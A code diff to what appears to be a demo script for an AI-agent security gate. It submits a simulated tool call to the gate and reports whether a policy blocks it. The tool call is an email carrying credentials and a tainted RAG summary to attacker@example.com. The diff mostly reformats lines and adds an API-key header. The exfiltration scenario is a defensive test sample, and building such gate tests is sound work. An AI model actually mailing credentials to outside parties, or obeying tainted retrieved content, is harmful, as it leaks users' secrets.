@@ -80,20 +80,31 @@ def run_taint_exfil() -> int:
                     "taint_level": "TAINTED",
                     "contains_credentials": True,
                 },
-                {"name": "to", "value": "attacker@example.com", "taint_level": "TAINTED"},
+                {
+                    "name": "to",
+                    "value": "attacker@example.com",
+                    "taint_level": "TAINTED",
+                },
             ],
         },
     }
+    service_key = os.environ.get("AEGIS_AGENT_GATE_API_KEYS", "").split(",")[0].strip()
+    headers = {"Authorization": f"Bearer {service_key}"} if service_key else {}
+
     print("Agent tool call (tainted RAG summary + credentials in email body):\n")
     print(json.dumps(payload["tool_call"], indent=2))
     print()
-    resp = httpx.post(f"{gate_url}/v1/evaluate", json=payload, timeout=30.0)
+    resp = httpx.post(
+        f"{gate_url}/v1/evaluate", json=payload, headers=headers, timeout=30.0
+    )
     data = resp.json()
     status = data.get("decision", {}).get("status", "UNKNOWN")
     print(f"RESULT: {status}")
     if status == "DENIED":
         print(f"  reason: {data['decision'].get('denial_reason', 'blocked by policy')}")
-        print("  (policy rule block-tainted-credentials: tainted data in credential fields)")
+        print(
+            "  (policy rule block-tainted-credentials: tainted data in credential fields)"
+        )
     else:
         print(json.dumps(data, indent=2))
     return 0
